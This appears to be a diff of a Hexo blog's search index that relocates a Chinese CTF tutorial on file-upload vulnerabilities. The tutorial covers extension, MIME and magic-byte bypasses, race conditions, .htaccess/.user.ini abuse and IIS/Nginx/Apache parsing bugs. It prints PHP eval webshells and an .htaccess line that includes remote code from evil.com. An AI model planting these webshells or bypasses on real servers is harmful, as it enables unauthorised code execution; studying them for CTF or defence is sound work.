-<h4 id="FastCGI利用"><a href="#FastCGI利用" class="headerlink" title="FastCGI利用"></a>FastCGI利用</h4><p>依赖<code>mod_fcgid.so</code>，默认安装包里是没有这个so文件的，但是在PHPstudy的默认配置中是已经加载了的，并且<code>AllowOverrride</code>也是All权限</p>
-<pre><code class="highlight plaintext">Options +ExecCGI
-AddHandler fcgid-script .gif
-FcgidWrapper &quot;/bin/bash&quot; .gif</code></pre>
-
-<h4 id="文件包含利用"><a href="#文件包含利用" class="headerlink" title="文件包含利用"></a>文件包含利用</h4><p><code>php_value auto_prepend_file +文件绝对路径</code>（默认是当前上传的目录）</p>
-<p>预先包含我们指定的文件</p>
-<pre><code class="highlight plaintext">php_flag allow_url_include 1
-php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
-#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
-#php_value auto_append_file https://evil.com/evil-code.txt</code></pre>
-
-<p>如果若我们预先包含.htaccess文件呢?效果是我们插入的恶意代码就会被任意包含</p>
-<p>大概像这样构造</p>
-<pre><code class="highlight plaintext">php_value auto_prepend_file &quot;.htaccess&quot;%0a#&lt;?php phpinfo();?&gt;</code></pre>
-
-<p>同时这个漏洞也可以造成xss漏洞和其他的一些文件包含漏洞</p>
-<h4 id="正经写入"><a href="#正经写入" class="headerlink" title="正经写入"></a>正经写入</h4><pre><code class="highlight plaintext">#
-&lt;IfModule mime_module&gt;
-AddHandler php5-script .gif          #在当前目录下，只针对gif文件会解析成Php代码执行
-SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行
-&lt;/IfModule&gt;
-
-#
-&lt;FilesMatch &quot;evil.gif&quot;&gt;
-SetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
-AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
-&lt;/FilesMatch&gt;
-较为精准，不容易误伤
-这边看到还有个写法:
-&lt;FilesMatch   &quot;shell&quot;&gt; 
-SetHandler  application/x-httpd-php 
-&lt;/FilesMatch&gt; (意思是把文件名中含shell的都当作php解析，包括还有一个正则的写法)
-
-#
-&lt;IfModule mime_module&gt;
-AddType application/x-httpd-php .gif (将.gif文件按照php代码进行解析执行)
-AddHandler php5-script .jpg	(将.jpg文件按照php代码进行解析执行)
-Sethandler application/x-httpd-php (将该目录及子目录下的文件均按照php文件解析执行)
-&lt;/IfModule&gt;
-容易误伤</code></pre>
-
-<h3 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h3><p>在文件后缀后加上<code>%0a</code>，绕过getshell</p>
-<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>配置 <code>Options +Indexes</code> 时Apache存在目录遍历漏洞。</p>
-<h3 id="lighttpd"><a href="#lighttpd" class="headerlink" title="lighttpd"></a>lighttpd</h3><p><code>xx.jpg/xx.php</code></p>
-<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="解析目录解析漏洞-test-asp-1-jpg"><a href="#解析目录解析漏洞-test-asp-1-jpg" class="headerlink" title="解析目录解析漏洞(&#x2F;test.asp&#x2F;1.jpg)"></a>解析目录解析漏洞(&#x2F;test.asp&#x2F;1.jpg)</h3><p>在 IIS5.x&#x2F;6.0 中，在网站下建立文件夹的名字为<code>*.asp、*.asa、*.cer、*.cdx </code>的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了</p>
-<h3 id="文件名解析漏洞-test-asp-jpg"><a href="#文件名解析漏洞-test-asp-jpg" class="headerlink" title="文件名解析漏洞(test.asp;.jpg)"></a>文件名解析漏洞(test.asp;.jpg)</h3><p>在 IIS5.x&#x2F;6.0 中， 分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 <code>.asa  .cer</code> 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <code>*.asp;.jpg、*.asa;.jpg、*.cer;.jpg</code> 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。</p>
-<h3 id="畸形解析漏洞-test-jpg-php"><a href="#畸形解析漏洞-test-jpg-php" class="headerlink" title="畸形解析漏洞(test.jpg&#x2F;*.php)"></a>畸形解析漏洞(test.jpg&#x2F;*.php)</h3><p>微软发布了IIS7.0修补了IIS6.0的解析漏洞，没想到IIS7.0爆出更严重的畸形解析漏洞，于是微软急忙发布了IIS7.5</p>
-<p>在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码</p>
-<p> <a href="https://img2020.cnblogs.com/i-beta/1964477/202003/1964477-20200308194604304-1865593941.png"><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/kisakiayano/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1964477-20200308194604304-1865593941.png" alt="img"></a></p>
-<p>将文件保存成test.jpg格式，上传到服务器，假设上传路径为&#x2F;upload，上传成功后，直接访问&#x2F;upload&#x2F;test.jpg&#x2F;x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行，所以图片里面的代码就会被执行。我们会神奇的发现在 &#x2F;upload 目录下创建了一个一句话木马文件<code> shell.php</code> 。</p>
-<p>临时解决办法：设置<code> cgi.fix_pathinfo</code>为0&#96;</p>
-<h3 id="其他解析漏洞"><a href="#其他解析漏洞" class="headerlink" title="其他解析漏洞"></a><strong>其他解析漏洞</strong></h3><p>在windows环境下，**xx.jpg[**<strong>空格]</strong> 或 <strong>xx.jpg.</strong> 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单。若上传成功，空格和点都会被windows自动消除。</p>
-<p>同时推荐一篇比较有意思的文章，lz自己没怎么看懂，但是感觉蛮有意思的</p>
-<p><a href="https://rivers.chaitin.cn/blog/cqr0pg10lne22g7e74ig">Black Hat USA 2024：利用Apache HTTP服务器中隐藏的语义歧义进行攻击！ | 长亭百川云</a></p>
-]]></content>
-      <tags>
-        <tag>-CTF -Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>文件包含</title>
     <url>/2025/01/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>依赖于<code>include()</code>,<code>require()</code>,<code>include_once()</code>,<code>require_once()</code>这些函数的漏洞</p>
@@ -7554,6 +7254,239 @@ conversions = &#123;
       </tags>
   </entry>
   <entry>
+    <title>文件上传漏洞</title>
+    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>大部分是需要回显储存路径才能打后续操作的，如果没有回显路径要不再想想。？(雾)</p>
+<h2 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h2><p>前端检测上传文件的后缀，js检测直接禁用js</p>
+<h2 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h2><h3 id="检测content-type"><a href="#检测content-type" class="headerlink" title="检测content-type"></a>检测content-type</h3><p>检测你发包的Content-Type参数来判断文件上传类型</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416151018927.png" alt="image-20250416151018927"></p>
+<p>一般你改一下content-type就可以绕过了</p>
+<h3 id="检测文件头判断文件类型"><a href="#检测文件头判断文件类型" class="headerlink" title="检测文件头判断文件类型"></a>检测文件头判断文件类型</h3><p>字义，使用getimagesize()函数来获取文件的MIME类型，此时检测的不是数据包中的content-type，而是文件头</p>
+<p>这种时候伪造一下就可以</p>
+<pre><code class="highlight scss"><span class="built_in">gif</span>(GIF89a) : <span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span> 
+jpg、jpeg : FF D8 FF 
+png : <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A</code></pre>
+
+<p>用winhex、010editor等十六进制处理工具，在数据最前面添加图片的文件头，从而绕过检测，或者你直接在包的头写个GIF89a也是可以过的</p>
+<h3 id="后端检测文件拓展名"><a href="#后端检测文件拓展名" class="headerlink" title="后端检测文件拓展名"></a>后端检测文件拓展名</h3><p>用拓展名的黑名单来检测文件拓展名从而防止危险文件的上传</p>
+<p>绕过:</p>
+<p>1)使用一些特殊扩展名来绕过,<code>php</code>可以用php3、php4、php5代替</p>
+<p>2)大小写混淆绕过</p>
+<p>3)在文件名后加<code>.</code>(空格，点，空格)，利用windows特性绕过</p>
+<p>4)在文件名后加<code>::$data</code>绕过(<strong>NTFS流</strong>读入)</p>
+<p>5)有替换的话可以双写绕过</p>
+<hr>
+<p>当然也可以是白名单只让特定的文件上传</p>
+<p>绕过:</p>
+<p>存储路径可以使用%00在最后进行截断，（注意：GET型可以对%00自动解码，但POST型不能，需要在二进制中修改&#x2F;&#x2F;打开你的010喵，用空格占个位来输00）</p>
+<h3 id="后端检测文件内容"><a href="#后端检测文件内容" class="headerlink" title="后端检测文件内容"></a>后端检测文件内容</h3><h4 id="文件内容替换"><a href="#文件内容替换" class="headerlink" title="文件内容替换"></a>文件内容替换</h4><p>检测原理：</p>
+<p>在后端处理上传的文件时，会将将文件中的敏感字符替换掉。<br>参考代码</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="variable">$path</span> = <span class="string">&quot;./uploads&quot;</span>;
+<span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);
+<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="variable">$content</span>);
+<span class="variable">$file</span> = <span class="variable">$path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];
+
+<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$file</span>)) &#123;
+        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);
+        <span class="keyword">echo</span> <span class="string">&#x27;Success!&lt;br&gt;&#x27;</span>;
+&#125; <span class="keyword">else</span> &#123;
+        <span class="keyword">echo</span> <span class="string">&#x27;Error!&lt;br&gt;&#x27;</span>;
+&#125;
+<span class="meta">?&gt;</span></code></pre>
+
+<p>绕过方法：<br>根据实际过滤的字符来判断，（一般不会限制所有敏感字符，因为还要兼顾图片上传）</p>
+<h4 id="图片二次渲染"><a href="#图片二次渲染" class="headerlink" title="图片二次渲染"></a>图片二次渲染</h4><p>检测原理：<br>后端调用了<code>php</code>的GD库，提取了文件中的图片数据，然后再重新渲染，这样图片中插入的恶意代码就会被过滤掉了</p>
+<p>绕过方法：<br>比较过滤前后文件内容，一般不会全部过滤。<br>比较使用<code>php-gd</code>转换之前和之后的gif图像，并搜索它们之间的任何相似性，因此，如果我在原始文件中找到相似的部分，则在使用<code>php-gd</code>转换后也保留了该部分然后我可以在那部分注入我的PHP代码并获得RCE</p>
+<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>该漏洞形成逻辑：<br>网站允许上传文件，然后检查上传文件是否包含<code>webshell</code>、是否是指定的文件类型。如果不是，那么删除该文件。在删除之前访问上传的<code>php</code>文件，从而执行上传文件中的<code>php</code>代码。</p>
+<p>绕过方法：<br>先进行文件上传，后进行判断与删除。利用时间差进行<code>webshell</code>上传。<br>竞争条件代码举例：</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+	<span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($\_POST\[&quot;cmd&quot;\])?&gt;&#x27;</span>);
+<span class="meta">?&gt;</span></code></pre>
+
+<p>判断是否删除</p>
+<pre><code class="highlight python"><span class="keyword">import</span> requests  
+<span class="keyword">while</span> true:  
+	requests.get(”路径“)</code></pre>
+
+<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>当文件完全被ban，只用以图片类型上传的时候，我们该怎么办呢</p>
+<h3 id="上传-htaccess文件绕过"><a href="#上传-htaccess文件绕过" class="headerlink" title="上传.htaccess文件绕过"></a>上传.htaccess文件绕过</h3><p><code>.htaccess</code>文件是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</p>
+<p><code>.htaccess</code>主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</p>
+<p><code>.htaccess</code>的用途范围主要针对当前目录</p>
+<p>类似内容</p>
+<pre><code class="highlight plaintext">ForceType application/x-httpd-php
+SetHandler application/x-httpd-php
+这些都会把上传的文件强制解析为php</code></pre>
+
+<h3 id="上传-user-ini文件绕过"><a href="#上传-user-ini文件绕过" class="headerlink" title="上传.user.ini文件绕过"></a>上传.user.ini文件绕过</h3><p><code>.user.ini</code>。它比<code>.htaccess</code>用的更广，不管是<code>nginx/apache/IIS</code>，只要是以<strong>fastcgi</strong>运行的<code>php</code>都可以用这个方法。</p>
+<p>那么什么是<code>.user.ini</code>？这得从<code>php.ini</code>说起了。<code>php.ini</code>是<code>php</code>默认的配置文件，其中包括了很多<code>php</code>的配置，这些配置中，又分为几种：<em>PHP_INI_SYSTEM</em>、<em>PHP_INI_PERDIR</em>、<em>PHP_INI_ALL</em>、<em>PHP_INI_USER</em>。在此可以查看：<a href="http://php.net/manual/zh/ini.list.php">http://php.net/manual/zh/ini.list.php</a> 这几种模式有什么区别？看看官方的解释：</p>
+<p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/kisakiayano/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/8d6872811ad6ca771a0debab4f7a50ce.png" alt="img"></p>
+<p>除了主 <code>php.ini </code>之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
+<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 <code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 模式的 INI 设置可被识别。</p>
+<p>所以除了<code>PHP_INI_SYSTEM</code>以外的模式（包括<code>PHP_INI_ALL</code>）都是可以通过<code>.user.ini</code>来设置的。我们可以很容易地借助<code>.user.ini</code>文件，更改<code>auto_prepend_file</code>配置项，来构造一个“后门”。</p>
+<p>比如，某网站限制不允许上传<code>.php</code>文件，你便可以上传一个<code>.user.ini</code>，再上传一个图片马，包含起来进行<code>getshell</code>。不过前提是含有<code>.user.ini</code>的文件夹下需要有正常的<code>php</code>文件，否则也不能包含了。再比如，你只是想隐藏个后门，这个方式是最方便的。</p>
+<p>实例([SUCTF 2019]CheckIn1):</p>
+<pre><code class="highlight javascript">$userdir = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_">md5</span>($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);
+<span class="keyword">if</span> (!<span class="title function_">file_exists</span>($userdir)) &#123;
+    <span class="title function_">mkdir</span>($userdir, <span class="number">0777</span>, <span class="literal">true</span>);
+&#125;
+<span class="title function_">file_put_contents</span>($userdir . <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;&quot;</span>);
+<span class="keyword">if</span> (<span class="title function_">isset</span>($_POST[<span class="string">&quot;upload&quot;</span>])) &#123;
+    $tmp_name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];
+    $name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];
+    <span class="keyword">if</span> (!$tmp_name) &#123;
+        <span class="title function_">die</span>(<span class="string">&quot;filesize too big!&quot;</span>);
+    &#125;
+    <span class="keyword">if</span> (!$name) &#123;
+        <span class="title function_">die</span>(<span class="string">&quot;filename cannot be empty!&quot;</span>);
+    &#125;
+    $extension = <span class="title function_">substr</span>($name, <span class="title function_">strrpos</span>($name, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);
+    <span class="keyword">if</span> (<span class="title function_">preg_match</span>(<span class="string">&quot;/ph|htaccess/i&quot;</span>, $extension)) &#123;
+        <span class="title function_">die</span>(<span class="string">&quot;illegal suffix!&quot;</span>);
+    &#125;
+    <span class="keyword">if</span> (<span class="title function_">mb_strpos</span>(<span class="title function_">file_get_contents</span>($tmp_name), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="variable constant_">FALSE</span>) &#123;
+        <span class="title function_">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);
+    &#125;
+    $image_type = <span class="title function_">exif_imagetype</span>($tmp_name);
+    <span class="keyword">if</span> (!$image_type) &#123;
+        <span class="title function_">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);
+    &#125;
+    $upload_file_path = $userdir . <span class="string">&quot;/&quot;</span> . $name;
+    <span class="title function_">move_uploaded_file</span>($tmp_name, $upload_file_path);
+    echo <span class="string">&quot;Your dir &quot;</span> . $userdir. <span class="string">&#x27; &lt;br&gt;&#x27;</span>;
+    echo <span class="string">&#x27;Your files : &lt;br&gt;&#x27;</span>;
+    <span class="title function_">var_dump</span>(<span class="title function_">scandir</span>($userdir));
+&#125;</code></pre>
+
+<p><strong>绕过技巧</strong>：</p>
+<p>1.针对过滤包含<code>ph</code>与<code>htaccess</code>扩展名的文件：上传<code>.user.ini</code>与图片马，利用<code>.user.ini</code>进行文件包含2.针对过滤文件内容包含<code>&lt;?</code>的文件：使用<code>php</code>的脚本标记风格<code>&lt;script language=&#39;php&#39;&gt;</code>3.针对使用<code>exif_imagetype</code>规定了必须为图片类型的文件：添加文件头内容或合成图片马（稍后会讲）</p>
+<p>首先上传<code>.user.ini</code>文件，文件内容为：</p>
+<pre><code class="highlight javascript"><span class="title class_">GIF89</span>a
+auto_prepend_file=shell.<span class="property">png</span></code></pre>
+
+<p>然后构造一个<code>shell.png</code>，内容如下：</p>
+<pre><code class="highlight javascript"><span class="title class_">GIF89</span>a
+&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;hack&#x27;</span>]); &lt;/script&gt;</code></pre>
+
+<p>然后将两个文件分别上传到服务器上，拿到回显</p>
+<h3 id="奇奇怪怪的绕过"><a href="#奇奇怪怪的绕过" class="headerlink" title="奇奇怪怪的绕过"></a>奇奇怪怪的绕过</h3><p>利用一下文件包含上传一个压缩包来getshell</p>
+<p>这里不细讲</p>
+<h2 id="Ngnix解析漏洞"><a href="#Ngnix解析漏洞" class="headerlink" title="Ngnix解析漏洞"></a>Ngnix解析漏洞</h2><h3 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h3><p>对于任意文件名，在后面添加<code>/abc.php</code>(abc为任意字符)后，即可将文件作为php解析</p>
+<p><strong>漏洞机理</strong></p>
+<p>Nginx配置导致，而非nginx版本问题，而取决于php的配置文件 php.ini 文件中是否开启了<code> cgi.fix_pathinfo</code></p>
+<p>当访问<code>xxx.jpg/abc.php</code>时，nginx查看URL后发现以php结尾，并将路径传递给<code>phpfastcgi</code>处理程序，php看到<code>xxx.jpg/abc.php</code>不存在，便删除去最后的<code>/abc.php</code>，看到<code>xxx.jpg</code>存在，而后以<code>php</code>的形式执行<code>xxx.jpg</code>的内容</p>
+<p>大概的来说，就是<code>cgi.fix_pathinfo</code>会对形如<code>/1.aaa/2.bbb/3.cccc</code>的文件路径进行处理，若该路径不存在，则会去掉最后的子路径再次判断直到找到一个存在的路径。</p>
+<p>若关闭该选项，访问<code>/xxx.jpg/abc.php</code>会返回找不到文件，但关闭该选项可能会导致一些其他错误，所以默认开启。</p>
+<p>在高版本中，引入了<code>security.limit_extensions</code>来纠正这个错误，限制了可执行文件的后缀，默认只允许执行<code>.php</code>文件。防止这一问题(回显Access denied)</p>
+<h3 id="空字节RCE"><a href="#空字节RCE" class="headerlink" title="空字节RCE"></a>空字节RCE</h3><p>Nginx在遇到%00空字节时与后段<code>FastCGI</code>处理不一致，导致可以在图中嵌入PHP代码然后通过访问<code>1.jpg%00.php</code>来执行其中的代码。</p>
+<p><strong>影响版本</strong></p>
+<pre><code class="highlight plaintext">nginx 0.5.*
+nginx 0.6.*
+nginx 0.7 &lt;= 0.7.65
+nginx 0.8 &lt;= 0.8.37</code></pre>
+
+<p>该漏洞不受cgi.fix_pathinfo影响，当为0时，依旧可以解析</p>
+<h3 id="CVE-2013-4547-20-00"><a href="#CVE-2013-4547-20-00" class="headerlink" title="CVE-2013-4547(%20%00)"></a>CVE-2013-4547(%20%00)</h3><p><strong>影响版本</strong></p>
+<pre><code class="highlight plaintext">nginx 0.8.41 ~ 1.5.6</code></pre>
+
+<p>原理是非法字符空格和截止符（%00）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。是什么意思呢？举个例子，假设服务器上存在文件：“file.jpg ”，注意文件名的最后一个字符是空格。则可以通过访问：<code>http://127.0.0.1/file.jpg \0.php</code> </p>
+<p>让Nginx认为文件“file.jpg ”的后缀为<code>.php</code></p>
+<p>来测试下，这次测试在Nginx&#x2F;1.0.15中进行。首先准备一张图片，命名为“test.html ”，注意，文件名含有空格。然后在浏览器中访问该文件，会得到一个404，因为浏览器自动将空格编码为%20，服务器中不存在文件“test.html%20”。</p>
+<p>测试目标是要让Nginx认为该文件是图片文件并正确地在浏览器中显示出来。我们想要的是未经编码的空格和截止符（\0），怎么办呢？使用Burp Suite抓取浏览器发出的请求包，修改为我们想要的样子，原本的URL是：<code>http://192.168.56.101/test.htmlAAAjpg </code>,将第一个“A”改成“20”（空格符号的ASCII码），将第二个“A”改成“00”（截止符），将第三个“A”改成“2e”（“.”的ASCII码），如图<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194656774-1403436835.png" alt="1964477-20200308194656774-1403436835"></p>
+<p>修改完毕后Forward该请求，在浏览器中看到：</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194716298-1059932045.png" alt="1964477-20200308194716298-1059932045"></p>
+<p>我们已经成功地利用了漏洞！但这有什么用呢？我们想要的是代码被执行。</p>
+<p>继续测试，准备文件“test.jpg ”，注意文件名的最后一个字符是空格，上传到服务器。文件内容为：</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></code></pre>
+
+<p>用Burp Suite抓包并修改，原本的URL是：<code>http://192.168.56.101/test.jpg…php</code> ,将jpg后的第一个“.”改为20，第二个“.”改为00，如下图所示</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194746793-602361880.png" alt="1964477-20200308194746793-602361880"></p>
+<p>修改完毕后 Forword 该请求，在浏览器中看到：Access denied ，好吧，又是这个。</p>
+<p>这说明Nginx在接收到这一请求后，确实把文件“test.jpg ”当做php文件交给php去执行了，只是php看到该文件后缀为“.jpg ”而拒绝执行。这样，便验证了Nginx确实存在该漏洞。但是由于<code>security.limit_extensions</code>的存在，导致我们并不能利用此漏洞</p>
+<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><h3 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h3><p><code>Apache</code>从右向左判断解析文件,若无法解析再继续向左判断,如<code>1.php.owf.rar</code>这个文件名，<code>Apache</code>无法解析<code>.owf</code>和<code>.rar</code>两个后缀，于是继续向前解析将其解析为1.php</p>
+<p>实际上许多后缀都可以被解析为php文件进行处理，这里贴一下其他师傅的文章</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250417211410728.png" alt="image-20250417211410728"></p>
+<pre><code class="highlight plaintext">原链接:https://www.cnblogs.com/yokan/p/12444476.html
+可以用shell.php/x.php/..绕</code></pre>
+
+<h3 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h3><p>是Apache下的一个配置文件，负责相关目录下的网页配置。通过<code> .htaccess</code>文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在 <code>httpd.conf</code> 文件中配置。</p>
+<pre><code class="highlight plaintext">生效前提:
+AllowOverride被启用/AllowOverride Options FileInfo
+mod_rewrite 模块开启
+cgi_module被加载。即apache配置文件中有LoadModule cgi_module modules/mod_cgi.so这么一句且没有被注释</code></pre>
+
+<p>这里放几个常用的配置</p>
+<h4 id><a href="#" class="headerlink" title></a></h4><pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
+
+<p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析</p>
+<h4 id="CGI启动方式利用"><a href="#CGI启动方式利用" class="headerlink" title="CGI启动方式利用"></a>CGI启动方式利用</h4><pre><code class="highlight plaintext">Options ExecCGI (表示允许CGI执行，若AllowOverride只有FileInfo权限且本身就开启了ExecCGI的话，就可以不需要这句话了。)
+AddHandler cgi-script .xx(将.xx后缀的文件当成CGI程序解析)
+#AddHandler application/x-httpd-php .php (给php后缀增加了处理器，这样即使有多个后缀，只要含有php后缀就会被识别为php文件)</code></pre>
+
+<p>下面是网上一个师傅的利用</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250418083343333.png" alt="image-20250418083343333"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250418083404184.png" alt="image-20250418083404184"></p>
+<h4 id="FastCGI利用"><a href="#FastCGI利用" class="headerlink" title="FastCGI利用"></a>FastCGI利用</h4><p>依赖<code>mod_fcgid.so</code>，默认安装包里是没有这个so文件的，但是在PHPstudy的默认配置中是已经加载了的，并且<code>AllowOverrride</code>也是All权限</p>
+<pre><code class="highlight plaintext">Options +ExecCGI
+AddHandler fcgid-script .gif
+FcgidWrapper &quot;/bin/bash&quot; .gif</code></pre>
+
+<h4 id="文件包含利用"><a href="#文件包含利用" class="headerlink" title="文件包含利用"></a>文件包含利用</h4><p><code>php_value auto_prepend_file +文件绝对路径</code>（默认是当前上传的目录）</p>
+<p>预先包含我们指定的文件</p>
+<pre><code class="highlight plaintext">php_flag allow_url_include 1
+php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
+#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
+#php_value auto_append_file https://evil.com/evil-code.txt</code></pre>
+
+<p>如果若我们预先包含.htaccess文件呢?效果是我们插入的恶意代码就会被任意包含</p>
+<p>大概像这样构造</p>
+<pre><code class="highlight plaintext">php_value auto_prepend_file &quot;.htaccess&quot;%0a#&lt;?php phpinfo();?&gt;</code></pre>
+
+<p>同时这个漏洞也可以造成xss漏洞和其他的一些文件包含漏洞</p>
+<h4 id="正经写入"><a href="#正经写入" class="headerlink" title="正经写入"></a>正经写入</h4><pre><code class="highlight plaintext">#
+&lt;IfModule mime_module&gt;
+AddHandler php5-script .gif          #在当前目录下，只针对gif文件会解析成Php代码执行
+SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行
+&lt;/IfModule&gt;
+
+#
+&lt;FilesMatch &quot;evil.gif&quot;&gt;
+SetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
+AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
+&lt;/FilesMatch&gt;
+较为精准，不容易误伤
+这边看到还有个写法:
+&lt;FilesMatch   &quot;shell&quot;&gt; 
+SetHandler  application/x-httpd-php 
+&lt;/FilesMatch&gt; (意思是把文件名中含shell的都当作php解析，包括还有一个正则的写法)
+
+#
+&lt;IfModule mime_module&gt;
+AddType application/x-httpd-php .gif (将.gif文件按照php代码进行解析执行)
+AddHandler php5-script .jpg	(将.jpg文件按照php代码进行解析执行)
+Sethandler application/x-httpd-php (将该目录及子目录下的文件均按照php文件解析执行)
+&lt;/IfModule&gt;
+容易误伤</code></pre>
+
